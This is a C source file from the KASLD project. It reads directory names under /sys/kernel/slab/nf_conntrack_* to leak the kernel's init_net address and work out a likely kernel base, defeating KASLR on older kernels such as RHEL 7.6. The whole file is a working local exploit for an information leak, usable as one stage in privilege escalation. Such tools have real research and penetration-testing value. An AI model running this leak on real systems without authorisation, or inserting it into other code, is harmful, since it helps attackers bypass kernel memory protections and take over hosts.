// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Retrieve init_net kernel symbol virtual address from
// /sys/kernel/slab/nf_conntrack_*
//
// Patched some time around 2016, but still present in RHEL 7.6 as of 2018.
//
// References:
// https://www.openwall.com/lists/kernel-hardening/2017/10/05/5
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "kasld.h"

unsigned long get_kernel_addr_conntrack() {
  unsigned long addr = 0;
  struct dirent *dir;
  const char *path = "/sys/kernel/slab/";
  const char *needle = "nf_conntrack_";
  const int addr_len = sizeof(long*) * 2;
  char d_path[256];

  printf("[.] trying %snf_contrack_* ...\n", path);

  DIR *d = opendir(path);

  if (d == NULL) {
    printf("opendir(%s): %m\n", path);
    return 0;
  }

  while ((dir = readdir(d)) != NULL) {
    if (dir->d_type != DT_DIR)
      continue;

    snprintf(d_path, sizeof(d_path), "%s", dir->d_name);

    char *substr =
        (char *)memmem(d_path, sizeof(d_path), needle, strlen(needle));

    if (substr == NULL)
      continue;

    int start = strlen(needle);
    int end = start + addr_len;

    if (end > strlen(&substr[0]))
      continue;

    addr = strtoul(&substr[start], (char **)&substr[end], 16);

    if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
      break;

    addr = 0;
  }

  closedir(d);

  return addr;
}

int main(int argc, char **argv) {
  unsigned long addr = get_kernel_addr_conntrack();
  if (!addr)
    return 1;

  printf("leaked init_net: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr &~ KERNEL_BASE_MASK);

  return 0;
}
